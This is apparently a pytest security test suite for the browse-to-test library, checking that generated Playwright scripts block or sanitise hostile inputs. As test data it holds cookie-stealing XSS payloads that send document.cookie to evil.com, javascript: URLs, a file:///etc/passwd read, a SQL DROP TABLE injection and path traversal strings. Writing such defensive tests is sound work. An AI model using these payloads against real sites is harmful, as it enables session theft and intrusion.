"""
Critical Security Issue Tests for browse-to-test

This test suite identifies and validates fixes for CRITICAL security vulnerabilities:

🚨 CRITICAL ISSUES IDENTIFIED:
1. JavaScript URL Injection (CVE-level severity)
2. Data URL XSS Vulnerability (High severity) 
3. Sensitive Data Exposure (High severity)
4. Input Sanitization Bypass (Medium severity)

These tests MUST pass before production deployment.
"""

import pytest
import browse_to_test as btt
from browse_to_test.core.config import ConfigBuilder
from browse_to_test.core.executor import BTTExecutor as E2eTestConverter


class TestCriticalSecurityVulnerabilities:
    """Critical security vulnerability tests - MUST PASS for production."""
    
    def test_javascript_url_injection_vulnerability(self):
        """
        🚨 CRITICAL: Test JavaScript URL injection vulnerability.
        
        VULNERABILITY: Malicious javascript: URLs are passed directly to page.goto()
        RISK: Code execution, XSS, session hijacking
        IMPACT: HIGH - Can execute arbitrary JavaScript in browser context
        """
        malicious_data = [
            {
                "model_output": {
                    "action": [{
                        "go_to_url": {
                            "url": "javascript:alert('SECURITY_BREACH_DETECTED')"
                        }
                    }]
                }
            }
        ]
        
        try:
            script = btt.convert(malicious_data, framework="playwright")
            
            # CRITICAL: JavaScript URLs should NEVER appear in generated scripts
            assert "javascript:alert" not in script, \
                "🚨 CRITICAL SECURITY VULNERABILITY: JavaScript URL injection detected!"
            assert "SECURITY_BREACH_DETECTED" not in script, \
                "🚨 CRITICAL: Malicious payload passed through to generated script!"
                
        except (ValueError, RuntimeError) as e:
            # It's acceptable to reject malicious URLs with appropriate error
            assert any(keyword in str(e).lower() for keyword in 
                      ["invalid", "unsafe", "malicious", "blocked", "rejected"]), \
                f"Error message should indicate security concern: {e}"
    
    def test_data_url_xss_vulnerability(self):
        """
        🚨 CRITICAL: Test data URL XSS vulnerability.
        
        VULNERABILITY: data: URLs with embedded scripts are passed to page.goto()
        RISK: XSS, code execution, data exfiltration
        IMPACT: HIGH - Can embed and execute malicious scripts
        """
        xss_data = [
            {
                "model_output": {
                    "action": [{
                        "go_to_url": {
                            "url": "data:text/html,<script>document.location='http://evil.com?cookie='+document.cookie</script>"
                        }
                    }]
                }
            }
        ]
        
        try:
            script = btt.convert(xss_data, framework="playwright")
            
            # CRITICAL: Data URLs with scripts should be blocked or sanitized
            assert "data:text/html,<script>" not in script, \
                "🚨 CRITICAL SECURITY VULNERABILITY: Data URL XSS vulnerability detected!"
            assert "evil.com" not in script, \
                "🚨 CRITICAL: Malicious data exfiltration URL passed through!"
            assert "document.cookie" not in script, \
                "🚨 CRITICAL: Cookie theft code passed through to script!"
                
        except (ValueError, RuntimeError) as e:
            # Acceptable to reject data URLs with scripts
            assert any(keyword in str(e).lower() for keyword in 
                      ["invalid", "unsafe", "malicious", "blocked", "rejected"]), \
                f"Error message should indicate security concern: {e}"
    
    def test_file_protocol_vulnerability(self):
        """
        🚨 HIGH: Test file:// protocol vulnerability.
        
        VULNERABILITY: file:// URLs could access local filesystem
        RISK: Local file access, information disclosure
        IMPACT: MEDIUM-HIGH - Can access local files in browser context
        """
        file_url_data = [
            {
                "model_output": {
                    "action": [{
                        "go_to_url": {
                            "url": "file:///etc/passwd"
                        }
                    }]
                }
            }
        ]
        
        try:
            script = btt.convert(file_url_data, framework="playwright")
            
            # file:// URLs should be handled carefully or blocked
            assert "file:///etc/passwd" not in script, \
                "🚨 HIGH RISK: File protocol access vulnerability detected!"
                
        except (ValueError, RuntimeError) as e:
            # Acceptable to reject file URLs
            assert any(keyword in str(e).lower() for keyword in 
                      ["invalid", "unsafe", "blocked", "file protocol"]), \
                f"Should reject file:// URLs with appropriate error: {e}"
    
    def test_sensitive_data_exposure_vulnerability(self):
        """
        🚨 HIGH: Test sensitive data exposure vulnerability.
        
        VULNERABILITY: Passwords, API keys, and sensitive data appear in scripts
        RISK: Credential exposure, data breach
        IMPACT: HIGH - Exposes user credentials and sensitive information
        """
        sensitive_data = [
            {
                "model_output": {
                    "action": [{
                        "fill": {
                            "selector": "input[name='password']",
                            "text": "MyVerySecretPassword123!"
                        }
                    }]
                }
            },
            {
                "model_output": {
                    "action": [{
                        "fill": {
                            "selector": "input[name='api_key']",
                            "text": "sk-proj-secret-api-key-12345"
                        }
                    }]
                }
            }
        ]
        
        config = ConfigBuilder() \
            .framework("playwright") \
            .sensitive_data_keys(["password", "api_key"]) \
            .build()
        
        converter = E2eTestConverter(config)
        script = converter.convert(sensitive_data)
        
        # CRITICAL: Sensitive data should NEVER appear in plain text
        assert "MyVerySecretPassword123!" not in script, \
            "🚨 HIGH RISK: Password exposed in generated script!"
        assert "sk-proj-secret-api-key-12345" not in script, \
            "🚨 HIGH RISK: API key exposed in generated script!"
        
        # Should have masking indicators
        masking_indicators = ["MASKED", "****", "${", "REDACTED", "<secret>", "SENSITIVE"]
        has_masking = any(indicator in script for indicator in masking_indicators)
        assert has_masking, \
            "🚨 MEDIUM RISK: No evidence of sensitive data masking implemented!"
    
    def test_script_injection_in_selectors(self):
        """
        🚨 MEDIUM: Test script injection via CSS selectors.
        
        VULNERABILITY: Malicious scripts embedded in CSS selectors
        RISK: XSS, code injection
        IMPACT: MEDIUM - Could potentially execute in specific contexts
        """
        malicious_selector_data = [
            {
                "model_output": {
                    "action": [{
                        "click": {
                            "selector": "button[onclick='javascript:alert(\"INJECTED\")']"
                        }
                    }]
                }
            }
        ]
        
        script = btt.convert(malicious_selector_data, framework="playwright")
        
        # Script content should be properly escaped
        assert "javascript:alert" not in script, \
            "🚨 MEDIUM RISK: JavaScript injection in selector not sanitized!"
        assert "INJECTED" not in script or "javascript:" not in script, \
            "🚨 MEDIUM RISK: Malicious script content passed through!"
    
    def test_sql_injection_in_form_data(self):
        """
        🚨 MEDIUM: Test SQL injection patterns in form data.
        
        VULNERABILITY: SQL injection patterns not escaped in generated scripts
        RISK: SQL injection if script used against vulnerable application
        IMPACT: MEDIUM - Could enable SQL injection in target application
        """
        sql_injection_data = [
            {
                "model_output": {
                    "action": [{
                        "fill": {
                            "selector": "input[name='username']",
                            "text": "admin'; DROP TABLE users; --"
                        }
                    }]
                }
            }
        ]
        
        script = btt.convert(sql_injection_data, framework="playwright")
        
        # SQL injection should be properly escaped/handled
        # The exact handling depends on implementation, but should be safe
        if "DROP TABLE" in script:
            # If SQL content is preserved, it should be properly quoted/escaped
            assert script.count("'") % 2 == 0 or "\\" in script, \
                "🚨 MEDIUM RISK: SQL injection pattern not properly escaped!"
    
    def test_path_traversal_vulnerability(self):
        """
        🚨 MEDIUM: Test path traversal vulnerability.
        
        VULNERABILITY: Path traversal patterns in URLs or file paths
        RISK: Directory traversal, file access
        IMPACT: MEDIUM - Could access unintended files or directories
        """
        path_traversal_data = [
            {
                "model_output": {
                    "action": [{
                        "go_to_url": {
                            "url": "https://example.com/../../etc/passwd"
                        }
                    }]
                }
            }
        ]
        
        script = btt.convert(path_traversal_data, framework="playwright")
        
        # Path traversal should be handled appropriately
        # Either rejected, sanitized, or clearly marked as potentially unsafe
        if "../" in script:
            # If preserved, should have some security warning or handling
            security_indicators = ["WARNING", "CAUTION", "NOTE", "TODO", "#"]
            has_warning = any(indicator in script for indicator in security_indicators)
            assert has_warning, \
                "🚨 MEDIUM RISK: Path traversal pattern without security warning!"


class TestSecurityMitigationValidation:
    """Validate that security mitigations are working correctly."""
    
    def test_url_validation_whitelist(self):
        """Test that URL validation works with safe URLs."""
        safe_data = [
            {
                "model_output": {
                    "action": [{
                        "go_to_url": {
                            "url": "https://example.com"
                        }
                    }]
                }
            }
        ]
        
        script = btt.convert(safe_data, framework="playwright")
        
        # Safe HTTPS URLs should work normally
        assert "https://example.com" in script, \
            "Safe HTTPS URLs should be preserved in scripts"
        assert len(script) > 100, "Should generate substantial script for safe URLs"
    
    def test_input_sanitization_effectiveness(self):
        """Test that input sanitization preserves safe content while blocking dangerous content."""
        # Test that normal safe URLs work fine
        safe_data = [
            {
                "model_output": {
                    "action": [{
                        "go_to_url": {
                            "url": "https://safe-example.com"
                        }
                    }]
                }
            }
        ]
        
        script = btt.convert(safe_data, framework="playwright")
        
        # Normal content should be preserved
        assert "https://safe-example.com" in script, \
            "Safe URLs should be preserved"
        
        # Test that dangerous URLs are sanitized 
        dangerous_data = [
            {
                "model_output": {
                    "action": [{
                        "go_to_url": {
                            "url": "javascript:alert('XSS')"
                        }
                    }]
                }
            }
        ]
        
        dangerous_script = btt.convert(dangerous_data, framework="playwright")
        
        # Dangerous content should be sanitized
        assert "javascript:alert" not in dangerous_script, \
            "Dangerous JavaScript URLs should be sanitized"
        assert "https://example.com" in dangerous_script, \
            "Should use safe placeholder URL"
    
    def test_error_handling_security(self):
        """Test that error handling doesn't expose sensitive information."""
        # This test would need to trigger various error conditions
        # and ensure error messages don't leak sensitive data
        pass


class TestSecurityRegressionPrevention:
    """Tests to prevent regression of security fixes."""
    
    def test_multiple_vulnerability_combination(self):
        """
        🚨 CRITICAL: Test combination of multiple vulnerabilities.
        
        Real attacks often combine multiple techniques.
        """
        multi_vector_data = [
            {
                "model_output": {
                    "action": [{
                        "go_to_url": {
                            "url": "javascript:fetch('http://evil.com?data='+btoa(document.cookie))"
                        }
                    }]
                }
            },
            {
                "model_output": {
                    "action": [{
                        "fill": {
                            "selector": "input[name='password']",
                            "text": "secret123"
                        }
                    }]
                }
            }
        ]
        
        try:
            script = btt.convert(multi_vector_data, framework="playwright")
            
            # All vulnerability patterns should be blocked
            assert "javascript:fetch" not in script, \
                "🚨 CRITICAL: JavaScript URL with fetch attack not blocked!"
            assert "evil.com" not in script, \
                "🚨 CRITICAL: Malicious domain not blocked!"
            assert "document.cookie" not in script, \
                "🚨 CRITICAL: Cookie theft code not blocked!"
            assert "secret123" not in script, \
                "🚨 HIGH: Password not masked in combined attack!"
                
        except (ValueError, RuntimeError) as e:
            # Acceptable to reject the entire malicious payload
            assert "invalid" in str(e).lower() or "unsafe" in str(e).lower(), \
                f"Should reject malicious combined payload: {e}"


def test_security_validation_summary():
    """Print security validation summary."""
    print("\n" + "🚨" * 20)
    print("CRITICAL SECURITY VULNERABILITY ASSESSMENT")
    print("🚨" * 20)
    
    vulnerabilities_found = []
    
    # Test each critical vulnerability
    try:
        # Test JavaScript URL injection
        script = btt.convert([{
            "model_output": {"action": [{"go_to_url": {"url": "javascript:alert('test')"}}]}
        }], framework="playwright")
        
        if "javascript:alert" in script:
            vulnerabilities_found.append("🚨 CRITICAL: JavaScript URL Injection")
    except:
        pass
    
    try:
        # Test data URL XSS  
        script = btt.convert([{
            "model_output": {"action": [{"go_to_url": {"url": "data:text/html,<script>alert('xss')</script>"}}]}
        }], framework="playwright")
        
        if "<script>" in script:
            vulnerabilities_found.append("🚨 CRITICAL: Data URL XSS")
    except:
        pass
    
    try:
        # Test sensitive data exposure
        from browse_to_test.core.executor import BTTExecutor as E2eTestConverter
        config = ConfigBuilder().framework("playwright").sensitive_data_keys(["password"]).build()
        converter = E2eTestConverter(config)
        script = converter.convert([{
            "model_output": {"action": [{"fill": {"selector": "input[name='password']", "text": "secret123"}}]}
        }])
        
        if "secret123" in script:
            vulnerabilities_found.append("🚨 HIGH: Sensitive Data Exposure")
    except:
        pass
    
    print("\nVULNERABILITIES DETECTED:")
    if vulnerabilities_found:
        for vuln in vulnerabilities_found:
            print(f"  {vuln}")
        print(f"\n⚠️  TOTAL CRITICAL ISSUES: {len(vulnerabilities_found)}")
        print("❌ PRODUCTION DEPLOYMENT BLOCKED until issues resolved!")
    else:
        print("  ✅ No critical vulnerabilities detected")
        print("  ✅ Security validation PASSED")
    
    print("\n" + "🚨" * 20)
    return len(vulnerabilities_found) == 0


if __name__ == "__main__":
    # Run security validation when executed directly
    passed = test_security_validation_summary()
    if not passed:
        exit(1)
    else:
        print("Security validation passed - safe for production deployment!")